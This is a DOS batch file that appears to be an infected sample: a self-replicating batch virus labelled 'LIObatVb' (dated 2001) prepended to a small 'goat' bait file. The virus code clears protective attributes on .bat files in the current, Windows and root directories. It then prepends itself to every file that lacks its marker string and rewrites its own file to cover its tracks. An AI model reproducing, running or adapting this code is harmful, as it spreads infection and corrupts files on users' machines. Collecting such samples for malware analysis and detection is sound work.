@echo off
if "%1"=="L" goto sudp>nul
set fn=*.bat>nul
attrib *.bat -s -r>nul
attrib %winbootdir%\*.bat -s -r>nul
attrib c:\*.bat -s -r>nul
for %%f in (%fn%) do call %0 L %%f>nul
for %%f in (%winbootdir%\%fn%) do call %0 L %%f>nul
for %%f in (c:\%fn%) do call %0 L %%f>nul
goto ppqe>nul
:sudp
find /i "liobatvb" %2>nul
if not errorlevel 1 goto eerend>nul
type %0>a
copy a b /a>nul
echo. >w
copy %2 q>nul
copy /b b+w+q %2 /y>nul
@del ?
goto eerend
:ppqe
echo rem              >x
copy x+x+x+x+x y>nul
copy y+y+y+y+y+y+y+y z>nul
@del y >nul
echo @del x>>z
echo @del z>>z
echo @echo on>>z
echo cls>>z
echo @%%comspec%% nul /ccopy %tmp%\temp.tmp %%0>>z
copy z x>nul
copy %0 %tmp%\temp.tmp>nul
@copy x %0>nul
rem *** This "LIObatVb" virus was created by LIO aka Qwyrek. It is not danger! 2001 (C). ***
:eerend
 
@echo off
echo ***********************************
echo ***********************************
echo ***********************************
echo * Goat bat file. Size = 305 bytes *
echo ***********************************
echo ***********************************
echo ***********************************
